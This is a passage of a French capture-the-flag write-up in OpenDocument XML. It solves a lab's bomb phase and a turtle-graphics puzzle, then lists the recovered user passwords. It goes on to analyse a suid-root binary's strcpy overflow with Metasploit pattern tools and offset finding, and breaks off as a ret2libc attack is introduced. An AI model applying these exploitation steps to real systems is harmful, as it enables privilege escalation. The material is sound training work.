      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">int_ptr2[</text:span><text:span text:style-name="T28">2</text:span><text:span text:style-name="T23">]</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">while</text:span> <text:span text:style-name="T23">(i</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T28">5</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">{</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(*(numbers[</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">])</text:span> <text:span text:style-name="T23">&lt;</text:span> <text:span text:style-name="T23">*(</text:span><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T23">*)numbers[</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">][</text:span><text:span text:style-name="T28">2</text:span><text:span text:style-name="T23">])</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="24"/><text:span text:style-name="T23">explode_bomb();</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">numbers[</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">]</text:span> <text:span text:style-name="T23">=</text:span> <text:span text:style-name="T23">(</text:span><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T23">*)numbers[</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">][</text:span><text:span text:style-name="T28">2</text:span><text:span text:style-name="T23">];</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="16"/><text:span text:style-name="T23">i++;</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T23">}</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="8"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">;</text:span></text:p>
      <text:p text:style-name="P15">}</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Le code source avait l'air un peu soûlant. On remarque qu'il faut 6 chiffres, qui ne peuvent adopter </text:span></text:span><text:soft-page-break/><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">que des valeurs entre 1 et 6. On connaît déjà le premier depuis les indices (4). On peut facilement bruteforce la bonne combinaison, ce que j'ai fait avec pwntools (voir </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">bruteforce.py</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> dans les ressources).</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Réponse à la phase 6 : "</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">4 2 6 3 1 5</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">"</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Bref, on a tout ce qu'il nous faut pour reconstituer le mot de passe de l'utilisateur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">thor</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. Plusieurs possibilités :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Publicspeakingisveryeasy.126241207201b2149opekmq426315</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Publicspeakingisveryeasy.126241207202b7559opekmq426315</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Publicspeakingisveryeasy.126241207202b2549opekmq426315</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Aucune des trois ne fonctionne. Le sujet est buggé, le mot de passe qui fonctionne est celui-ci (inverser le 3 et le 1 pour la réponse de la phase 6, alors même qu'il ne s'agit alors pas d'une réponse acceptable de la phase 6) :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Publicspeakingisveryeasy.126241207201b2149opekmq426135</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3">&gt;&gt;&gt; THOR USER : 'TURTLE' CHALLENGE</text:span></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T11"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On se connecte en tant que l'utilisateur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">thor</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">. On a, dans son dossier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/home</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, un fichier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">turtle</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> qui a la structure suivante :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Tourne gauche de 90 degrees</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Avance 50 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Avance 1 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Tourne gauche de 1 degrees</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Avance 1 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">[... SNIP ...]</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Avance 50 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Avance 100 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Recule 200 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Avance 100 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Tourne droite de 90 degrees</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Avance 100 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Tourne droite de 90 degrees</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Avance 100 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Recule 200 spaces</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Can you digest the message? :)</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On reconnaît ici ce qui ressemble à du </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">turtle programming</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://www.geeksforgeeks.org/turtle-programming-python/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">https://www.geeksforgeeks.org/turtle-programming-python/</text:span></text:span></text:a><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> </text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://docs.python.org/3/library/turtle.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">https://docs.python.org/3/library/turtle.html</text:span></text:span></text:a><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> </text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Il s'agit d'un langage très simple, composé de quelques instructions (forward, left...) qui permettent de "dessiner" des motifs. Pas besoin d'installer quoi que ce soit, la librairie </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">turtle</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> fait partie de python3 et nous permet d'ouvrir une fenêtre pour voir ce qu'on a dessiné :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">from turtle import *</text:span></text:span></text:p>
      <text:p text:style-name="P10">color('red', 'yellow')</text:p>
      <text:p text:style-name="P10">begin_fill()</text:p>
      <text:p text:style-name="P10"><text:soft-page-break/>while True:</text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/>forward(200)</text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/>left(170)</text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/>if abs(pos()) &lt; 1:</text:p>
      <text:p text:style-name="P10"><text:s text:c="8"/>break</text:p>
      <text:p text:style-name="P10">end_fill()</text:p>
      <text:p text:style-name="P13">done()</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Il nous faut donc simplement traduire les instructions en français vers des instructions </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">turtle</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Tourne gauche de 90 degrees<text:tab/><text:tab/>--&gt; left(90)</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Avance 100 spaces<text:tab/><text:tab/><text:tab/>--&gt; forward(100)</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">etc...</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">J'ai décortiqué le fichier d'instructions, et j'en suis arrivé à la traduction de ce script turtle :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P18"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T34">from</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T25">turtle</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T34">import</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T14"> </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T25">*</text:span></text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:span text:style-name="T23">color(</text:span><text:span text:style-name="T36">'red'</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T36">'yellow'</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P21">begin_fill()</text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P25"># DRAWING AN 'S'</text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">left(</text:span><text:span text:style-name="T28">90</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">50</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T33">for</text:span> <text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">in</text:span> <text:span text:style-name="T23">range(</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T28">180</text:span><text:span text:style-name="T23">):</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/><text:span text:style-name="T23">left(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T33">for</text:span> <text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">in</text:span> <text:span text:style-name="T23">range(</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T28">179</text:span><text:span text:style-name="T23">):</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">50</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P25"># DRAWING AN 'L'</text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">210</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">backward(</text:span><text:span text:style-name="T28">210</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">90</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">120</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P25"># DRAWING AN 'A'</text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">10</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">200</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">150</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">200</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">backward(</text:span><text:span text:style-name="T28">100</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">120</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">50</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P25"># DRAWING AN 'S'</text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">left(</text:span><text:span text:style-name="T28">90</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">50</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:soft-page-break/></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T33">for</text:span> <text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">in</text:span> <text:span text:style-name="T23">range(</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T28">180</text:span><text:span text:style-name="T23">):</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/><text:span text:style-name="T23">left(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T33">for</text:span> <text:span text:style-name="T23">i</text:span> <text:span text:style-name="T23">in</text:span> <text:span text:style-name="T23">range(</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">,</text:span> <text:span text:style-name="T28">179</text:span><text:span text:style-name="T23">):</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:s text:c="4"/><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">50</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P25"># DRAWING AN 'H'</text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">100</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">backward(</text:span><text:span text:style-name="T28">200</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">100</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">90</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">100</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">right(</text:span><text:span text:style-name="T28">90</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">forward(</text:span><text:span text:style-name="T28">100</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"><text:span text:style-name="T23">backward(</text:span><text:span text:style-name="T28">200</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P21">end_fill()</text:p>
      <text:p text:style-name="P15">done()</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Au début, le dessin ne faisait pas vraiment sens. Cependant, on s'est rendu compte que dans le fichier d'instruction, on avait parfois des lignes vides. En exécutant les instructions turtle séparément en fonction de ces lignes vides, on voit qu'on dessine en réalité lettre par lettre le mot </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">SLASH</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Puisqu'à la fin du fichier d'instructions on a </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">Can you digest the message? :)</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, on passe le mot </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">SLASH</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> au md5digest, et on l'utilise comme mot de passe pour l'utilisateur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">zaz</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">.</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text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T3">&gt;&gt;&gt; ZAZ USER : 'EXPLOIT_ME' CHALLENGE</text:span></text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T11"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Une fois connecté en tant que l'utilisateur </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">zaz</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, on trouve dans son dossier </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">/home</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> un </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">binaire suid root</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> qui se nomme </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">exploit_me</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> (ELF 32 bits).</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On reconstruit le code source de ce binaire, qui est très basique :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P27">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P19"><text:span text:style-name="T19">int</text:span> <text:s text:c="4"/><text:span text:style-name="T29">main</text:span><text:span text:style-name="T23">(</text:span><text:span text:style-name="T19">int</text:span> <text:span text:style-name="T23">argc,</text:span> <text:span text:style-name="T19">char</text:span> <text:span text:style-name="T23">**argv)</text:span></text:p>
      <text:p text:style-name="P20">{</text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T19">char</text:span> <text:s text:c="3"/><text:span text:style-name="T23">buff[</text:span><text:span text:style-name="T28">128</text:span><text:span text:style-name="T23">];</text:span></text:p>
      <text:p text:style-name="P19"/>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T33">if</text:span> <text:span text:style-name="T23">(argc</text:span> <text:span text:style-name="T23">!=</text:span> <text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">)</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="16"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">(</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">);</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T23">strcpy(buff,</text:span> <text:span text:style-name="T23">argv[</text:span><text:span text:style-name="T28">1</text:span><text:span text:style-name="T23">]);</text:span></text:p>
      <text:p text:style-name="P19"><text:soft-page-break/><text:s text:c="8"/><text:span text:style-name="T23">puts(buff);</text:span></text:p>
      <text:p text:style-name="P19"><text:s text:c="8"/><text:span text:style-name="T33">return</text:span> <text:span text:style-name="T23">(</text:span><text:span text:style-name="T28">0</text:span><text:span text:style-name="T23">);</text:span></text:p>
      <text:p text:style-name="P14">}</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On a ici un buffer overflow vraiment évident, avec un buffer local à taille fixe, dans lequel est copié </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">argv[1]</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> qui peut avoir n'importe quelle longueur. On peut donc très simplement overwrite l'adresse de retour de main pour prendre le contrôle du programme.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On commence par calculer l'offset de </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">argv[1]</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> auquel va crash le programme avec un pattern, qu'on donne au binaire dans </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">gdb</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">, ce qui nous permet de vérifier ensuite la position des caractères qui ont overwrite l'adresse de retour :</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr3" draw:name="images8" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="3.186cm" draw:z-index="7"><draw:image xlink:href="Pictures/20000007000059EC000010DA3D7EF46E.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T12">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37654136</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">On voit que suite au </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">140</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">ème caractère, l'adresse de retour est écrasée. De là, on vérifie les protections activées sur le binaire avec un </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">checksec </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">: pas de NX (on peut exécuter du shellcode sur la stack), et pas de PIE (donc pas d'ASLR).</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Sur le système cible, l'ASLR est entièrement désactivé, donc les shared libraries sont également chargées à des adresses fixes.</text:span></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"/></text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4">Au vu du manque total de protection sur le binaire, on peut l'exploiter de pas mal de façons différentes. On choisit de faire un </text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T5">ret2libc</text:span></text:span><text:span text:style-name="Source_20_Text"><text:span text:style-name="T4"> très basique :</text:span></text:span></text:p>
